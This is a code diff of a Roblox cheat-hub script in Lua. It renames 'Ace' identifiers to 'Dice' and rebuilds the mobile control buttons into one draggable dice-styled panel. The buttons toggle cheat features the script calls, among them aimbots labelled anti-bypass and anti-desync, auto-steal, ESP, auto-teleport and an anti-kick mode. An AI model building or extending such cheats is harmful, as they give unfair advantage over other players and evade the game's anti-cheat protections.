+if _G.DiceSyncToggleVisuals then _G.DiceSyncToggleVisuals() end
 end)
 customFontVisualEnabled = false
 if V then V.customFontEnabled = false end
 function enableCustomFont() customFontVisualEnabled=false; if V then V.customFontEnabled=false end end
 function disableCustomFont() customFontVisualEnabled=false; if V then V.customFontEnabled=false end end
-_G.AceDuelsApplySavedGameplayStates = function()
+_G.DiceDuelsApplySavedGameplayStates = function()
 pcall(function()
 if setAutoTPVisual then setAutoTPVisual(autoTPEnabled == true) end
 if autoTPEnabled then startAutoTP() else stopAutoTP() end
@@ -7436,25 +8423,25 @@ if setAntiRagdoll then setAntiRagdoll(antiRagdollEnabled == true) end
 end)
 pcall(function()
 if setAutoStealVisual then setAutoStealVisual(autoStealEnabled == true) end
-if _G.AceAutoStealSync then _G.AceAutoStealSync() end
+if _G.DiceAutoStealSync then _G.DiceAutoStealSync() end
 end)
 pcall(function()
 if setBatCounterVisual then setBatCounterVisual(batCounterEnabled == true) end
-if batCounterEnabled and _G.AceStartBatCounter then _G.AceStartBatCounter() elseif _G.AceStopBatCounter then _G.AceStopBatCounter() end
+if batCounterEnabled and _G.DiceStartBatCounter then _G.DiceStartBatCounter() elseif _G.DiceStopBatCounter then _G.DiceStopBatCounter() end
 end)
 pcall(function()
 if setMedCounterVisual then setMedCounterVisual(medCounterEnabled == true) end
-if medCounterEnabled and _G.AceStartMedCounter then _G.AceStartMedCounter(LP.Character) elseif _G.AceStopMedCounter then _G.AceStopMedCounter() end
+if medCounterEnabled and _G.DiceStartMedCounter then _G.DiceStartMedCounter(LP.Character) elseif _G.DiceStopMedCounter then _G.DiceStopMedCounter() end
 end)
 pcall(function()
-if _G.AceSetNoPlayerCollisionVisual then _G.AceSetNoPlayerCollisionVisual(_G.AceNoPlayerCollisionEnabled == true) end
-if _G.AceNoPlayerCollisionEnabled then enableNoPlayerCollision() else disableNoPlayerCollision() end
+if _G.DiceSetNoPlayerCollisionVisual then _G.DiceSetNoPlayerCollisionVisual(_G.DiceNoPlayerCollisionEnabled == true) end
+if _G.DiceNoPlayerCollisionEnabled then enableNoPlayerCollision() else disableNoPlayerCollision() end
 end)
 pcall(function()
 if setSafeModeVisual then setSafeModeVisual(antiKickEnabled == true) end
 end)
 pcall(function()
-if _G.AceSetAutoResetOnMed then _G.AceSetAutoResetOnMed(autoResetOnMedEnabled == true, true) end
+if _G.DiceSetAutoResetOnMed then _G.DiceSetAutoResetOnMed(autoResetOnMedEnabled == true, true) end
 end)
 pcall(function()
 if setPlayerESPVisual then setPlayerESPVisual(espEnabled == true) end
@@ -7501,60 +8488,60 @@ end)
 end
 task.defer(function()
 task.wait(0.25)
-if _G.AceDuelsApplySavedGameplayStates then _G.AceDuelsApplySavedGameplayStates() end
+if _G.DiceDuelsApplySavedGameplayStates then _G.DiceDuelsApplySavedGameplayStates() end
 end)
 task.delay(1.25, function()
-if _G.AceDuelsApplySavedGameplayStates then _G.AceDuelsApplySavedGameplayStates() end
+if _G.DiceDuelsApplySavedGameplayStates then _G.DiceDuelsApplySavedGameplayStates() end
 end)
 task.delay(3, function()
 if antiLagVisualEnabled and type(applyKTMOptimization) == "function" then pcall(applyKTMOptimization) end
 if nukeOptimiserEnabled and type(applyKTMOptimization) == "function" then pcall(applyKTMOptimization) end
 end)
-_G.AceAutoTPRestoreWanted = _G.AceAutoTPRestoreWanted or false
-_G.AceAutoTPRestoreBlockedUntil = _G.AceAutoTPRestoreBlockedUntil or 0
-function aceAnyAimbotActive()
-return (_G.AceNormalAimbotOn == true) or (_G.AceAntiBypassAimbotOn == true) or (_G.AceAntiDesyncAimbotOn == true) or (_G.AceAntiDesyncAimbotOn == true)
+_G.DiceAutoTPRestoreWanted = _G.DiceAutoTPRestoreWanted or false
+_G.DiceAutoTPRestoreBlockedUntil = _G.DiceAutoTPRestoreBlockedUntil or 0
+function diceAnyAimbotActive()
+return (_G.DiceNormalAimbotOn == true) or (_G.DiceAntiBypassAimbotOn == true) or (_G.DiceAntiDesyncAimbotOn == true) or (_G.DiceAntiDesyncAimbotOn == true)
 end
-_G.AceStopAutoTPForAction = function()
+_G.DiceStopAutoTPForAction = function()
 if autoTPEnabled then
-_G.AceAutoTPRestoreWanted = true
-_G.AceAutoTPRestoreBlockedUntil = tick() + 0.35
+_G.DiceAutoTPRestoreWanted = true
+_G.DiceAutoTPRestoreBlockedUntil = tick() + 0.35
 stopAutoTP()
 if setAutoTPVisual then setAutoTPVisual(false) end
 end
 end
-function aceTryRestoreAutoTP()
-if not _G.AceAutoTPRestoreWanted then return end
-if tick() < (_G.AceAutoTPRestoreBlockedUntil or 0) then return end
-if aceAnyAimbotActive() then return end
+function diceTryRestoreAutoTP()
+if not _G.DiceAutoTPRestoreWanted then return end
+if tick() < (_G.DiceAutoTPRestoreBlockedUntil or 0) then return end
+if diceAnyAimbotActive() then return end
 if dropBrainrotActive then return end
-_G.AceAutoTPRestoreWanted = false
+_G.DiceAutoTPRestoreWanted = false
 startAutoTP()
 if setAutoTPVisual then setAutoTPVisual(true) end
-saveAceConfig()
+saveDiceConfig()
 end
-RunService.Heartbeat:Connect(aceTryRestoreAutoTP)
-_G._oldAceStopNormalAimbot = _G.AceStopNormalAimbot
-_G.AceStopNormalAimbot = function(...)
-local r = {_G._oldAceStopNormalAimbot(...)}
-_G.AceAutoTPRestoreBlockedUntil = tick() + 0.05
-task.delay(0.08, aceTryRestoreAutoTP)
+RunService.Heartbeat:Connect(diceTryRestoreAutoTP)
+_G._oldDiceStopNormalAimbot = _G.DiceStopNormalAimbot
+_G.DiceStopNormalAimbot = function(...)
+local r = {_G._oldDiceStopNormalAimbot(...)}
+_G.DiceAutoTPRestoreBlockedUntil = tick() + 0.05
+task.delay(0.08, diceTryRestoreAutoTP)
 return unpack(r)
 end
-_G.AceNormalAimbotStop = _G.AceStopNormalAimbot
-_G._oldAceStopAntiBypassAimbot = _G.AceStopAntiBypassAimbot
-_G.AceStopAntiBypassAimbot = function(...)
-local r = {_G._oldAceStopAntiBypassAimbot(...)}
-_G.AceAutoTPRestoreBlockedUntil = tick() + 0.05
-task.delay(0.08, aceTryRestoreAutoTP)
+_G.DiceNormalAimbotStop = _G.DiceStopNormalAimbot
+_G._oldDiceStopAntiBypassAimbot = _G.DiceStopAntiBypassAimbot
+_G.DiceStopAntiBypassAimbot = function(...)
+local r = {_G._oldDiceStopAntiBypassAimbot(...)}
+_G.DiceAutoTPRestoreBlockedUntil = tick() + 0.05
+task.delay(0.08, diceTryRestoreAutoTP)
 return unpack(r)
 end
-_G.AceAntiBypassStop = _G.AceStopAntiBypassAimbot
-_G._oldAceStopAntiDesyncAimbot = _G.AceStopAntiDesyncAimbot
-_G.AceStopAntiDesyncAimbot = function(...)
-local r = {_G._oldAceStopAntiDesyncAimbot(...)}
-_G.AceAutoTPRestoreBlockedUntil = tick() + 0.05
-task.delay(0.08, aceTryRestoreAutoTP)
+_G.DiceAntiBypassStop = _G.DiceStopAntiBypassAimbot
+_G._oldDiceStopAntiDesyncAimbot = _G.DiceStopAntiDesyncAimbot
+_G.DiceStopAntiDesyncAimbot = function(...)
+local r = {_G._oldDiceStopAntiDesyncAimbot(...)}
+_G.DiceAutoTPRestoreBlockedUntil = tick() + 0.05
+task.delay(0.08, diceTryRestoreAutoTP)
 return unpack(r)
 end
 task.spawn(function()
@@ -7564,12 +8551,12 @@ if dropBrainrotActive then
 wasDropping = true
 elseif wasDropping then
 wasDropping = false
-_G.AceAutoTPRestoreBlockedUntil = tick() + 0.05
-task.delay(0.08, aceTryRestoreAutoTP)
+_G.DiceAutoTPRestoreBlockedUntil = tick() + 0.05
+task.delay(0.08, diceTryRestoreAutoTP)
 end
 end
 end)
-function aceRepairKeybinds()
+function diceRepairKeybinds()
 for keyId, defaultKey in pairs(DEFAULT_SPEED_KEYBINDS) do
 if speedKeybinds[keyId] == Enum.KeyCode.Unknown then
 speedKeybinds[keyId] = defaultKey
@@ -7579,304 +8566,290 @@ if tpDownKeybind == Enum.KeyCode.Unknown then tpDownKeybind = DEFAULT_TP_DOWN_KE
 if refreshAllSpeedKeybinds then refreshAllSpeedKeybinds() end
 if refreshTPDownKeybind then refreshTPDownKeybind() end
 end
-_G._oldSaveAceConfigStable = saveAceConfig
-saveAceConfig = function()
-aceRepairKeybinds()
-return _G._oldSaveAceConfigStable()
+_G._oldSaveDiceConfigStable = saveDiceConfig
+saveDiceConfig = function()
+diceRepairKeybinds()
+return _G._oldSaveDiceConfigStable()
 end
-aceRepairKeybinds()
+diceRepairKeybinds()
 task.defer(function()
 task.wait(0.2)
-aceRepairKeybinds()
-saveAceConfig()
+diceRepairKeybinds()
+saveDiceConfig()
 end)
 task.defer(function()
 task.wait(0.35)
 local TS = game:GetService("TweenService")
-local old = PlayerGui:FindFirstChild("AceMobileButtons")
+local old = PlayerGui:FindFirstChild("DiceMobileButtons")
 if old then old:Destroy() end
 local mobileGui = Instance.new("ScreenGui")
-mobileGui.Name = "AceMobileButtons"
+mobileGui.Name = "RainyMobileButtons"
 mobileGui.ResetOnSpawn = false
 mobileGui.IgnoreGuiInset = true
 mobileGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 mobileGui.DisplayOrder = 1000
 mobileGui.Parent = PlayerGui
-_G.AceMobileButtonRefs = {}
-local mobileButtons = _G.AceMobileButtonRefs
-function _G.AceApplyMobileButtonsHidden()
-local g = PlayerGui:FindFirstChild("AceMobileButtons")
-if g then g.Enabled = not (_G.AceHideMobileButtons == true) end
-if setHideMobileButtonsVisual then pcall(setHideMobileButtonsVisual, _G.AceHideMobileButtons == true) end
+_G.DiceMobileButtonRefs = {}
+local mobileButtons = _G.DiceMobileButtonRefs
+-- ═══════════════════════════════════════════════════════════════
+-- MOBILE PANEL
+-- One draggable grid rather than ten loose buttons. Each button is a
+-- die: dark face with light pips when off, white face with dark pips
+-- when on. Pips sit in the corners so the label never collides.
+-- ═══════════════════════════════════════════════════════════════
+local BTN_SIZE = 58
+local BTN_GAP = 14
+local PADDING = 6
+local COLS = 3
+local ROWS = 4
+local PANEL_W = PADDING * 2 + COLS * BTN_SIZE + (COLS - 1) * BTN_GAP
+local PANEL_H = PADDING * 2 + ROWS * BTN_SIZE + (ROWS - 1) * BTN_GAP
+local PANEL_DEFAULT = UDim2.new(1, -(PANEL_W + 20), 0.5, -(PANEL_H / 2))
+local FACE_OFF = Color3.fromRGB(9, 17, 33)
+local FACE_ON = Color3.fromRGB(56, 138, 255)
+local TEXT_OFF = Color3.fromRGB(206, 226, 255)
+local TEXT_ON = Color3.fromRGB(255, 255, 255)
+-- Corner-only pip spots keep the middle of the die clear for the label.
+local MOBILE_PIPS = {
+[2] = {{0.19, 0.18}, {0.81, 0.82}},
+[4] = {{0.19, 0.18}, {0.81, 0.18}, {0.19, 0.82}, {0.81, 0.82}},
+}
+local MobilePanel = Instance.new("Frame")
+MobilePanel.Name = "MobileButtonsPanel"
+MobilePanel.Size = UDim2.new(0, PANEL_W, 0, PANEL_H)
+MobilePanel.Position = tableToUDim2(_G.DiceMobileButtonPositions and _G.DiceMobileButtonPositions.panel, PANEL_DEFAULT)
+MobilePanel.BackgroundTransparency = 1
+MobilePanel.BorderSizePixel = 0
+MobilePanel.Active = true
+MobilePanel.ZIndex = 1000
+MobilePanel.Parent = mobileGui
+_G.DiceMobilePanel = MobilePanel
+function _G.DiceApplyMobileButtonsHidden()
+local g = PlayerGui:FindFirstChild("DiceMobileButtons")
+if g then g.Enabled = not (_G.DiceHideMobileButtons == true) end
+if setHideMobileButtonsVisual then pcall(setHideMobileButtonsVisual, _G.DiceHideMobileButtons == true) end
 end
-function _G.AceApplyMobileButtonSize()
-_G.AceMobileButtonScale = math.clamp(tonumber(_G.AceMobileButtonScale) or 0.75, 0.30, 1.35)
-for _, entry in pairs(mobileButtons) do
-local holder = entry and entry.holder
-if holder then
-local sc = holder:FindFirstChild("MobileButtonScale") or Instance.new("UIScale")
+function _G.DiceApplyMobileButtonSize()
+_G.DiceMobileButtonScale = math.clamp(tonumber(_G.DiceMobileButtonScale) or 0.75, 0.30, 1.35)
+local sc = MobilePanel:FindFirstChild("MobileButtonScale") or Instance.new("UIScale")
 sc.Name = "MobileButtonScale"
-sc.Scale = _G.AceMobileButtonScale
-sc.Parent = holder
-end
-end
+sc.Scale = _G.DiceMobileButtonScale
+sc.Parent = MobilePanel
 pcall(function()
-local gui = PlayerGui:FindFirstChild("RainyHub") or PlayerGui:FindFirstChild("AceDuelsAdaptReconstruct") or PlayerGui:FindFirstChild("AdaptHubPolished") or PlayerGui:FindFirstChild("CyberHub")
+local gui = PlayerGui:FindFirstChild("DiceDuelsAdaptReconstruct") or PlayerGui:FindFirstChild("AdaptHubPolished") or PlayerGui:FindFirstChild("CyberHub")
 local root = gui or PlayerGui
 for _, obj in ipairs(root:GetDescendants()) do
 if obj.Name == "Mobile Buttons Size" then
 local valueBox = obj:FindFirstChild("Value")
 if valueBox and valueBox:IsA("TextLabel") then
-valueBox.Text = string.format("%.2f", _G.AceMobileButtonScale)
+valueBox.Text = string.format("%.2f", _G.DiceMobileButtonScale)
 end
 end
 end
 end)
 end
--- blue mobile pad: dark navy when off, hub accent when on
-MB_OFF = Color3.fromRGB(9, 17, 33)
-MB_ON = Color3.fromRGB(56, 138, 255)
-MB_TEXT_OFF = Color3.fromRGB(206, 226, 255)
-MB_TEXT_ON = Color3.fromRGB(255, 255, 255)
-MB_EDGE_OFF = Color3.fromRGB(40, 66, 110)
-MB_EDGE_ON = Color3.fromRGB(126, 186, 255)
+-- The whole grid drags as one unit. Buttons feed the same drag state, so
+-- you can grab the panel anywhere: a tap fires the button, a drag past
+-- the threshold moves the panel and cancels the tap.
+local panelDrag = {active = false, moved = false, start = nil, origin = nil}
+local DRAG_DEADZONE = 6
+local function beginPanelDrag(input)
+if _G.DiceGuiLocked == true then return end
+panelDrag.active = true
+panelDrag.moved = false
+panelDrag.start = input.Position
+panelDrag.origin = MobilePanel.Position
+end
+local function endPanelDrag()
+local moved = panelDrag.moved
+panelDrag.active = false
+panelDrag.moved = false
+if moved then task.defer(saveDiceConfig) end
+return moved
+end
+MobilePanel.InputBegan:Connect(function(input)
+if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+beginPanelDrag(input)
+end
+end)
+MobilePanel.InputEnded:Connect(function(input)
+if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+endPanelDrag()
+end
+end)
+UserInputService.InputChanged:Connect(function(input)
+if not panelDrag.active or _G.DiceGuiLocked == true then return end
+if input.UserInputType ~= Enum.UserInputType.MouseMovement and input.UserInputType ~= Enum.UserInputType.Touch then return end
+local delta = input.Position - panelDrag.start
+if not panelDrag.moved and (math.abs(delta.X) > DRAG_DEADZONE or math.abs(delta.Y) > DRAG_DEADZONE) then
+panelDrag.moved = true
+end
+if panelDrag.moved then
+MobilePanel.Position = UDim2.new(
+panelDrag.origin.X.Scale, panelDrag.origin.X.Offset + delta.X,
+panelDrag.origin.Y.Scale, panelDrag.origin.Y.Offset + delta.Y
+)
+end
+end)
 local function setActive(btn, state)
 if not btn then return end
-local pressed = btn:GetAttribute("AceMobilePressed") == true
+local pressed = btn:GetAttribute("DiceMobilePressed") == true
 state = (state == true) or pressed
 local visualState = state and "on" or "off"
-if btn:GetAttribute("AceMobileVisualState") == visualState then return end
-btn:SetAttribute("AceMobileVisualState", visualState)
-local holder = btn.Parent
-local glow = holder and holder:FindFirstChild("Glow")
+if btn:GetAttribute("DiceMobileVisualState") == visualState then return end
+btn:SetAttribute("DiceMobileVisualState", visualState)
+TS:Create(btn, TweenInfo.new(0.15), {
+BackgroundColor3 = state and FACE_ON or FACE_OFF,
+TextColor3 = state and TEXT_ON or TEXT_OFF,
+}):Play()
 local st = btn:FindFirstChildOfClass("UIStroke")
-TS:Create(btn, TweenInfo.new(0.18), {
-BackgroundColor3 = state and MB_ON or MB_OFF,
-TextColor3 = state and MB_TEXT_ON or MB_TEXT_OFF,
-TextTransparency = 0,
-}):Play()
 if st then
-TS:Create(st, TweenInfo.new(0.18), {
-Color = state and MB_EDGE_ON or MB_EDGE_OFF,
-Thickness = 1.2,
-Transparency = state and 0 or 0.35,
+TS:Create(st, TweenInfo.new(0.15), {
+Color = state and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(78, 78, 84),
+Transparency = state and 0.1 or 0.45,
 }):Play()
 end
-if glow then
-glow.Visible = false
-glow.BackgroundTransparency = 1
-local gs = glow:FindFirstChildOfClass("UIStroke")
-if gs then gs.Transparency = 1 end
+local pipHolder = btn:FindFirstChild("Pips")
+if pipHolder then
+for _, pip in ipairs(pipHolder:GetChildren()) do
+TS:Create(pip, TweenInfo.new(0.15), {
+BackgroundColor3 = state and TEXT_ON or TEXT_OFF,
+BackgroundTransparency = state and 0 or 0.35,
+}):Play()
 end
 end
+end
+-- Momentary feedback for the buttons that fire an action rather than latch.
 local function pulse(btn)
 if not btn then return end
-btn:SetAttribute("AceMobilePressed", true)
+btn:SetAttribute("DiceMobilePressed", true)
 setActive(btn, true)
-task.delay(0.18, function()
+task.delay(0.2, function()
 if btn and btn.Parent then
-btn:SetAttribute("AceMobilePressed", false)
+btn:SetAttribute("DiceMobilePressed", false)
 setActive(btn, false)
 end
 end)
 end
-local function makeButton(key, label, pos, onPress)
-local holder = Instance.new("Frame")
-holder.Name = "MBH_" .. key
-holder.Size = UDim2.new(0, MB_SIZE, 0, MB_SIZE)
-holder.Position = tableToUDim2(_G.AceMobileButtonPositions[key], pos)
-holder.BackgroundTransparency = 1
-holder.BorderSizePixel = 0
-holder.ZIndex = 1000
-holder.Active = true
-holder.Parent = mobileGui
-local glow = Instance.new("Frame", holder)
-glow.Name = "Glow"
-glow.Size = UDim2.new(1, 4, 1, 4)
-glow.Position = UDim2.new(0, -2, 0, -2)
-glow.BackgroundColor3 = MB_ON
-glow.BackgroundTransparency = 1
-glow.BorderSizePixel = 0
-glow.ZIndex = 1000
-Instance.new("UICorner", glow).CornerRadius = UDim.new(0, 15)
-local glowStroke = Instance.new("UIStroke", glow)
-glowStroke.Color = MB_ON
-glowStroke.Thickness = 0.8
-glowStroke.Transparency = 1
-glowStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-local btn = Instance.new("TextButton", holder)
+local function makeButton(key, label, col, row, face, onPress)
+local btn = Instance.new("TextButton")
 btn.Name = "MB_" .. key
-btn.Size = UDim2.new(1, 0, 1, 0)
-btn.Position = UDim2.new(0, 0, 0, 0)
-btn.BackgroundColor3 = MB_OFF
-btn.BackgroundTransparency = 0
+btn.Size = UDim2.new(0, BTN_SIZE, 0, BTN_SIZE)
+btn.Position = UDim2.new(0, PADDING + col * (BTN_SIZE + BTN_GAP), 0, PADDING + row * (BTN_SIZE + BTN_GAP))
+btn.BackgroundColor3 = FACE_OFF
 btn.BorderSizePixel = 0
 btn.Text = label
-btn.TextColor3 = MB_TEXT_OFF
+btn.TextColor3 = TEXT_OFF
 btn.Font = Enum.Font.GothamBold
-btn.TextSize = 11
-btn.LineHeight = 1.2
+btn.TextSize = 10
 btn.TextWrapped = true
+btn.LineHeight = 1.15
 btn.AutoButtonColor = false
 btn.ZIndex = 1002
 btn.Active = true
+btn.Parent = MobilePanel
 Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 12)
-local stroke = Instance.new("UIStroke", btn)
-stroke.Color = MB_EDGE_OFF
-stroke.Thickness = 1
-stroke.Transparency = 0.4
-stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-local pressing, dragging = false, false
-local pressPos, holderStart = nil, nil
-btn.InputBegan:Connect(function(i)
-if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
-pressing = true
-dragging = false
-pressPos = i.Position
-holderStart = holder.Position
-btn:SetAttribute("AceMobilePressed", true)
-setActive(btn, true)
-pcall(function()
-TS:Create(btn, TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
-Position = UDim2.new(0, 0, 0, 4),
-Size = UDim2.new(1, 0, 1, -4)
-}):Play()
-end)
+local st = Instance.new("UIStroke", btn)
+st.Color = Color3.fromRGB(78, 78, 84)
+st.Thickness = 1
+st.Transparency = 0.45
+st.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+local pipHolder = Instance.new("Frame", btn)
+pipHolder.Name = "Pips"
+pipHolder.Size = UDim2.new(1, 0, 1, 0)
+pipHolder.BackgroundTransparency = 1
+pipHolder.ZIndex = 1003
+for _, spot in ipairs(MOBILE_PIPS[face] or MOBILE_PIPS[4]) do
+local pip = Instance.new("Frame")
+pip.AnchorPoint = Vector2.new(0.5, 0.5)
+pip.Size = UDim2.new(0, 5, 0, 5)
+pip.Position = UDim2.new(spot[1], 0, spot[2], 0)
+pip.BackgroundColor3 = TEXT_OFF
+pip.BackgroundTransparency = 0.35
+pip.BorderSizePixel = 0
+pip.ZIndex = 1003
+pip.Parent = pipHolder
+Instance.new("UICorner", pip).CornerRadius = UDim.new(1, 0)
+end
+btn.InputBegan:Connect(function(input)
+if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+beginPanelDrag(input)
 end
 end)
-btn.InputEnded:Connect(function(i)
-if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
-if pressing and not dragging then pcall(onPress, btn) end
-if dragging then saveAceConfig() end
-pressing = false
-dragging = false
-btn:SetAttribute("AceMobilePressed", false)
-pcall(function()
-TS:Create(btn, TweenInfo.new(0.10, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
-Position = UDim2.new(0, 0, 0, 0),
-Size = UDim2.new(1, 0, 1, 0)
-}):Play()
+btn.InputEnded:Connect(function(input)
+if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then return end
+if not endPanelDrag() then pcall(onPress, btn) end
 end)
-task.delay(0.08, function()
-if btn and btn.Parent then
-local keepOn = false
-if key == "autoLeft" then keepOn = autoLeftEnabled == true
-elseif key == "autoRight" then keepOn = autoRightEnabled == true
-elseif key == "aimbot" then keepOn = (_G.AceNormalAimbotOn == true) or (_G.AceAntiBypassAimbotOn == true)
-elseif key == "antiDesync" then keepOn = _G.AceAntiDesyncAimbotOn == true
-elseif key == "carry" then keepOn = currentSpeedMode == "Carry"
-elseif key == "laggerNormal" then keepOn = currentSpeedMode == "Lagger"
-elseif key == "laggerCarry" then keepOn = currentSpeedMode == "Lagger Carry"
-end
-setActive(btn, keepOn)
-end
-end)
-end
-end)
-UserInputService.InputChanged:Connect(function(i)
-if _G.AceGuiLocked == true or not pressing then return end
-if i.UserInputType ~= Enum.UserInputType.MouseMovement and i.UserInputType ~= Enum.UserInputType.Touch then return end
-local delta = i.Position - pressPos
-if not dragging and (math.abs(delta.X) > 6 or math.abs(delta.Y) > 6) then dragging = true end
-if dragging then
-holder.Position = UDim2.new(holderStart.X.Scale, holderStart.X.Offset + delta.X, holderStart.Y.Scale, holderStart.Y.Offset + delta.Y)
-end
-end)
-mobileButtons[key] = {holder = holder, btn = btn, setActive = function(state) setActive(btn, state) end}
+mobileButtons[key] = {holder = MobilePanel, btn = btn, setActive = function(state) setActive(btn, state) end}
 return btn
 end
--- Envy-style pad: 58px squares, 14px gutters, two columns pinned to the
--- bottom-right. Ten buttons, so five rows rather than Envy's four.
-MB_SIZE, MB_GAP = 58, 14
-local cA = -(MB_SIZE * 2 + MB_GAP + 20)
-local cB = cA + MB_SIZE + MB_GAP
-local rBase = -(MB_SIZE * 5 + MB_GAP * 4 + 20)
-local function mbRow(r) return rBase + r * (MB_SIZE + MB_GAP) end
-local defaults = {
-insta        = UDim2.new(1, cA, 1, mbRow(0)),
-drop         = UDim2.new(1, cB, 1, mbRow(0)),
-autoLeft     = UDim2.new(1, cA, 1, mbRow(1)),
-autoRight    = UDim2.new(1, cB, 1, mbRow(1)),
-antiDesync   = UDim2.new(1, cA, 1, mbRow(2)),
-aimbot       = UDim2.new(1, cB, 1, mbRow(2)),
-tp           = UDim2.new(1, cA, 1, mbRow(3)),
-carry        = UDim2.new(1, cB, 1, mbRow(3)),
-laggerNormal = UDim2.new(1, cA, 1, mbRow(4)),
-laggerCarry  = UDim2.new(1, cB, 1, mbRow(4)),
-}
-function _G.AceResetMobileButtons()
-_G.AceMobileButtonScale = 0.75
-_G.AceHideMobileButtons = false
-for key, defaultPos in pairs(defaults) do
-local entry = mobileButtons[key]
-local holder = entry and entry.holder
-if holder then
-holder.Position = defaultPos
-holder.Size = UDim2.new(0, MB_SIZE, 0, MB_SIZE)
-local btn = entry.btn
+function _G.DiceResetMobileButtons()
+_G.DiceMobileButtonScale = 0.75
+_G.DiceHideMobileButtons = false
+MobilePanel.Position = PANEL_DEFAULT
+for _, entry in pairs(mobileButtons) do
+local btn = entry and entry.btn
 if btn then
-btn.Position = UDim2.new(0, 0, 0, 0)
-btn.Size = UDim2.new(1, 0, 1, 0)
-btn:SetAttribute("AceMobilePressed", false)
-btn:SetAttribute("AceMobileVisualState", nil)
+btn:SetAttribute("DiceMobilePressed", false)
+btn:SetAttribute("DiceMobileVisualState", nil)
 end
 end
-end
-if _G.AceApplyMobileButtonSize then _G.AceApplyMobileButtonSize() end
-if _G.AceApplyMobileButtonsHidden then _G.AceApplyMobileButtonsHidden() end
+if _G.DiceApplyMobileButtonSize then _G.DiceApplyMobileButtonSize() end
+if _G.DiceApplyMobileButtonsHidden then _G.DiceApplyMobileButtonsHidden() end
 if showActionNotification then pcall(function() showActionNotification("MOBILE BUTTONS RESET") end) end
-saveAceConfig()
+saveDiceConfig()
 end
-makeButton("insta", "INSTA\nRESET", defaults.insta, function(btn)
-if _G.AceCursedInstaReset then _G.AceCursedInstaReset() elseif cursedInstaReset then cursedInstaReset() end
+-- Two pips mark the momentary actions, four the latching toggles.
+makeButton("insta", "INSTA\nRESET", 0, 0, 2, function(btn)
+if _G.DiceCursedInstaReset then _G.DiceCursedInstaReset() elseif cursedInstaReset then cursedInstaReset() end
 pulse(btn)
 end)
-makeButton("drop", "DROP\nBR", defaults.drop, function(btn)
+makeButton("drop", "DROP\nBR", 1, 0, 2, function(btn)
 if runDropBrainrot then runDropBrainrot() elseif runDrop then runDrop() end
 pulse(btn)
 end)
-makeButton("autoLeft", "AUTO\nLEFT", defaults.autoLeft, function(btn)
-if _G.AceSetAutoLeft then _G.AceSetAutoLeft(not autoLeftEnabled) end
+makeButton("autoLeft", "AUTO\nLEFT", 2, 0, 4, function(btn)
+if _G.DiceSetAutoLeft then _G.DiceSetAutoLeft(not autoLeftEnabled) end
 task.delay(0.03, function()
 if mobileButtons.autoLeft then mobileButtons.autoLeft.setActive(autoLeftEnabled == true) end
 if mobileButtons.autoRight then mobileButtons.autoRight.setActive(autoRightEnabled == true) end
 end)
 end)
-makeButton("antiDesync", "TP\nBAT", defaults.antiDesync, function(btn)
-if _G.AceSafeModeIsLocked and _G.AceSafeModeIsLocked() then
-if _G.AceSafeModeForceStop then _G.AceSafeModeForceStop("SAFE MODE LOCK") end
+makeButton("antiDesync", "TP\nBAT", 0, 1, 4, function(btn)
+if _G.DiceSafeModeIsLocked and _G.DiceSafeModeIsLocked() then
+if _G.DiceSafeModeForceStop then _G.DiceSafeModeForceStop("SAFE MODE LOCK") end
 return
 end
-if _G.AceToggleAntiDesyncAimbot then
-_G.AceToggleAntiDesyncAimbot()
-elseif _G.AceStartAntiDesyncAimbot and _G.AceStopAntiDesyncAimbot then
-if _G.AceAntiDesyncAimbotOn then _G.AceStopAntiDesyncAimbot() else _G.AceStartAntiDesyncAimbot() end
+if _G.DiceToggleAntiDesyncAimbot then
+_G.DiceToggleAntiDesyncAimbot()
+elseif _G.DiceStartAntiDesyncAimbot and _G.DiceStopAntiDesyncAimbot then
+if _G.DiceAntiDesyncAimbotOn then _G.DiceStopAntiDesyncAimbot() else _G.DiceStartAntiDesyncAimbot() end
 end
-task.delay(0.03, function() setActive(btn, _G.AceAntiDesyncAimbotOn == true) end)
+task.delay(0.03, function() setActive(btn, _G.DiceAntiDesyncAimbotOn == true) end)
 end)
-makeButton("aimbot", "BAT\nAIMBOT", defaults.aimbot, function(btn)
-if _G.AceSafeModeIsLocked and _G.AceSafeModeIsLocked() then
-if _G.AceSafeModeForceStop then _G.AceSafeModeForceStop("SAFE MODE LOCK") end
+makeButton("aimbot", "BAT\nAIMBOT", 1, 1, 4, function(btn)
+if _G.DiceSafeModeIsLocked and _G.DiceSafeModeIsLocked() then
+if _G.DiceSafeModeForceStop then _G.DiceSafeModeForceStop("SAFE MODE LOCK") end
 return
 end
-if _G.AceToggleSelectedAimbot then _G.AceToggleSelectedAimbot() end
-if _G.AceRefreshAimbotVisual then _G.AceRefreshAimbotVisual() end
+if _G.DiceToggleSelectedAimbot then _G.DiceToggleSelectedAimbot() end
+if _G.DiceRefreshAimbotVisual then _G.DiceRefreshAimbotVisual() end
 task.delay(0.03, function()
-setActive(btn, (_G.AceNormalAimbotOn == true) or (_G.AceAntiBypassAimbotOn == true))
+setActive(btn, (_G.DiceNormalAimbotOn == true) or (_G.DiceAntiBypassAimbotOn == true))
 end)
 end)
-makeButton("autoRight", "AUTO\nRIGHT", defaults.autoRight, function(btn)
-if _G.AceSetAutoRight then _G.AceSetAutoRight(not autoRightEnabled) end
+makeButton("autoRight", "AUTO\nRIGHT", 2, 1, 4, function(btn)
+if _G.DiceSetAutoRight then _G.DiceSetAutoRight(not autoRightEnabled) end
 task.delay(0.03, function()
 if mobileButtons.autoRight then mobileButtons.autoRight.setActive(autoRightEnabled == true) end
